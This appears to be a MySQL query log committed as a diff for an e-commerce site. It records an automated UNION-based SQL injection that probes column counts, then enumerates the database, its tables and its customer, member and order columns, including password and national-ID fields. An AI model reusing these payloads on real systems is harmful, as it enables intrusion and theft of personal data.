+[2021-02-12 20:31:33]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:31:33]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:33]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:31:33]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:33]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:33]	select * from _tbl_sub_category where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:33]	SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+[2021-02-12 20:31:33]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:33]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:33]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:31:33]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:33]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:31:33]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:33]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:33]	select * from _tbl_sub_category where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:33]	SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+[2021-02-12 20:31:34]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:34]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:34]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:31:34]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:34]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:31:34]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:34]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:34]	select * from _tbl_sub_category where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:34]	SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+[2021-02-12 20:31:34]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:34]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:34]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:31:34]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:34]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:31:34]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:34]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:34]	select * from _tbl_sub_category where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:34]	SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+[2021-02-12 20:31:35]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:35]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:35]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:31:35]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:35]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:31:35]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:35]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:35]	select * from _tbl_sub_category where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:35]	SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+[2021-02-12 20:31:35]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:35]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:35]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:31:35]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:35]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:31:35]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:35]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:35]	select * from _tbl_sub_category where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:35]	select CategoryID from _tbl_products where SubCategoryID='1025480056'  and IsActive='1'
+[2021-02-12 20:31:36]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:36]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,0x7233646D3076335F68766A5F696E6A656374696F6E,0x27,0x7e) limit 0,1),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:36]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:31:36]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,0x7233646D3076335F68766A5F696E6A656374696F6E,0x27,0x7e) limit 0,1),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:36]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:31:36]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:36]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:36]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x7e,0x27,0x7233646D3076335F68766A5F696E6A656374696F6E,0x27,0x7e) limit 0,1),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:36]	select CategoryID from _tbl_products where SubCategoryID='~'r3dm0v3_hvj_injection'~'  and IsActive='1'
+[2021-02-12 20:31:36]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'r3dm0v3_hvj_injection'~'  and IsActive='1'' at line 1
+[2021-02-12 20:31:37]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:37]	select * from _tbl_products where CategoryID='999999.9' union all select concat(0x7e,0x27,unhex(Hex(cast(database() as char))),0x27,0x7e),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:37]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:31:37]	select * from _tbl_products where CategoryID='999999.9' union all select concat(0x7e,0x27,unhex(Hex(cast(database() as char))),0x27,0x7e),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:37]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:31:37]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:37]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:37]	select * from _tbl_sub_category where CategoryID='999999.9' union all select concat(0x7e,0x27,unhex(Hex(cast(database() as char))),0x27,0x7e),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:37]	select CategoryID from _tbl_products where SubCategoryID='~'klxmart_ecommerce'~'  and IsActive='1'
+[2021-02-12 20:31:37]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'klxmart_ecommerce'~'  and IsActive='1'' at line 1
+[2021-02-12 20:31:42]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:42]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(table_name),0x27,0x7e) from `information_schema`.tables where table_schema=0x6B6C786D6172745F65636F6D6D65726365),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:42]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:31:42]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(table_name),0x27,0x7e) from `information_schema`.tables where table_schema=0x6B6C786D6172745F65636F6D6D65726365),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:42]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:31:42]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:42]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:42]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(table_name),0x27,0x7e) from `information_schema`.tables where table_schema=0x6B6C786D6172745F65636F6D6D65726365),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:42]	select CategoryID from _tbl_products where SubCategoryID='~'25'~'  and IsActive='1'
+[2021-02-12 20:31:42]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '25'~'  and IsActive='1'' at line 1
+[2021-02-12 20:31:42]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:42]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(table_name) as char))),0x27,0x7e) from `information_schema`.tables where table_schema=0x6B6C786D6172745F65636F6D6D65726365),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:42]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:31:42]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(table_name) as char))),0x27,0x7e) from `information_schema`.tables where table_schema=0x6B6C786D6172745F65636F6D6D65726365),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:42]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:31:42]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:42]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:42]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(table_name) as char))),0x27,0x7e) from `information_schema`.tables where table_schema=0x6B6C786D6172745F65636F6D6D65726365),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:42]	select CategoryID from _tbl_products where SubCategoryID='~'_tbl_admin,_tbl_admin_login_logs,_tbl_brands,_tbl_category,_tbl_customer,_tbl_customer_bankinformations,_tbl_invoices,_tbl_invoices_items,_tbl_log_mobilesms,_tbl_log_password_charge,_tbl_logs_email,_tbl_logs_orderstatus_change,_tbl_members,_tbl_orders,_tbl_orders_items,_tbl_orders_status,_tbl_product_additional_image,_tbl_products,_tbl_right_sliders,_tbl_sliders,_tbl_sub_category,_tbl_verification_code,_tbl_wallet,_tbl_whishlist,receipt'~'  and IsActive='1'
+[2021-02-12 20:31:42]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '_tbl_admin,_tbl_admin_login_logs,_tbl_brands,_tbl_category,_tbl_customer,_tbl_cu' at line 1
+[2021-02-12 20:32:14]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:14]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(column_name),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F637573746F6D6572),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:14]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:14]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(column_name),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F637573746F6D6572),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:14]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:14]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:14]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:14]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(column_name),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F637573746F6D6572),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:14]	select CategoryID from _tbl_products where SubCategoryID='~'16'~'  and IsActive='1'
+[2021-02-12 20:32:14]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '16'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:15]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:15]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(column_name) as char))),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F637573746F6D6572),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:15]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:15]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(column_name) as char))),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F637573746F6D6572),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:15]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:15]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:15]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:15]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(column_name) as char))),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F637573746F6D6572),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:15]	select CategoryID from _tbl_products where SubCategoryID='~'CustomerID,CustomerCode,CustomerName,EmailID,MobileNumber,Password,AddressLine1,AddressLine2,AddressLine3,PostalCode,LandMark,IsActive,CreatedOn,Referral,CreatedBy,ManualCreate'~'  and IsActive='1'
+[2021-02-12 20:32:15]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'CustomerID,CustomerCode,CustomerName,EmailID,MobileNumber,Password,AddressLine1,' at line 1
+[2021-02-12 20:32:15]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:15]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(column_name),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F6D656D62657273),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:15]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:15]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(column_name),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F6D656D62657273),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:15]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:15]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:15]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:15]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(column_name),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F6D656D62657273),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:15]	select CategoryID from _tbl_products where SubCategoryID='~'34'~'  and IsActive='1'
+[2021-02-12 20:32:15]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '34'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:16]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:16]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(column_name) as char))),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F6D656D62657273),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:16]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:16]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(column_name) as char))),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F6D656D62657273),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:16]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:16]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:16]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:16]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(column_name) as char))),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F6D656D62657273),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:16]	select CategoryID from _tbl_products where SubCategoryID='~'MemberID,UID,MemberCode,MemberName,MemberFatherName,MemberSurname,MemberMobileNumber,MemberPassword,SponsorID,SponsorCode,SponsorName,CreatedOn,IsActive,EmailID,Username,AddressLine1,AddressLine2,AddressLine3,City,State,Country,PinCode,AadhaarNumber,PancardNumber,VoterIDNumber,Sex,DateOfBirth,EduDetails,KycVerified,KycVerifiedOn,NomineeVerified,NomineeVerifiedOn,BankAccountVerified,BankAccountVerifiedOn'~'  and IsActive='1'
+[2021-02-12 20:32:16]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'MemberID,UID,MemberCode,MemberName,MemberFatherName,MemberSurname,MemberMobileNu' at line 1
+[2021-02-12 20:32:17]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:17]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(column_name),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F6F7264657273),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:17]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:17]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(column_name),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F6F7264657273),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:17]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:17]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:17]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:17]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(column_name),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F6F7264657273),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:17]	select CategoryID from _tbl_products where SubCategoryID='~'24'~'  and IsActive='1'
+[2021-02-12 20:32:17]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '24'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:18]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:18]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(column_name) as char))),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F6F7264657273),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:18]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:18]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(column_name) as char))),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F6F7264657273),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:18]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:18]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:18]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:18]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(column_name) as char))),0x27,0x7e) from `information_schema`.columns where table_schema=0x6B6C786D6172745F65636F6D6D65726365 and table_name=0x5F74626C5F6F7264657273),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:18]	select CategoryID from _tbl_products where SubCategoryID='~'OrderID,OrderCode,CustomerID,OrderDate,CustomerName,CustomerEmailID,CustomerMobileNumber,BillingAddress1,BillingAddress2,BillingAddress3,BillingPincode,BillingLandMark,OrderTotal,DiscountAmount,SGST,CGST,IGST,DeliveryCharge,NetPayableAmount,PaymentMode,OrderStatus,IsPaid,InvoiceID,TotalUplevelCommission'~'  and IsActive='1'
+[2021-02-12 20:32:18]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'OrderID,OrderCode,CustomerID,OrderDate,CustomerName,CustomerEmailID,CustomerMobi' at line 1
+[2021-02-12 20:32:32]	select * from _tbl_category where IsActive='1' order by ListOrder
